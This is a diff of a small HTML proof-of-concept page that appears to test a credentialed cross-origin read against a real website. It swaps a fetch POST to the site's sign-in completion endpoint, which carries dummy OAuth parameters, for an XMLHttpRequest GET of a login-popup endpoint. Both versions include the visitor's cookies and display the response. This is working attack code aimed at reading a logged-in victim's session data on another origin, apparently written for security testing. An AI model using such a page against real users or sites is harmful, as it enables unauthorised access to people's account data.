@@ -2,20 +2,21 @@
 <html>
 <body>
 <script>
-fetch("https://www.apartments.com/Authentication/CompleteSignIn", {
-    method: "POST",
-    credentials: "include",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-    },
-    body: "code=test&state=test&session_state=test"
-})
-.then(r => r.text())
-.then(data => {
-    console.log(data);
-    document.body.innerHTML = "<pre>" + data + "</pre>";
-})
-.catch(err => console.log(err));
+var xhr = new XMLHttpRequest();
+
+xhr.open(
+    "GET",
+    "https://www.apartments.com/loginpopup/getloginpopup/?ViewName=HomePage",
+    true
+);
+
+xhr.withCredentials = true;
+
+xhr.onload = function() {
+    alert(xhr.responseText);
+};
+
+xhr.send();
 </script>
 </body>
 </html>
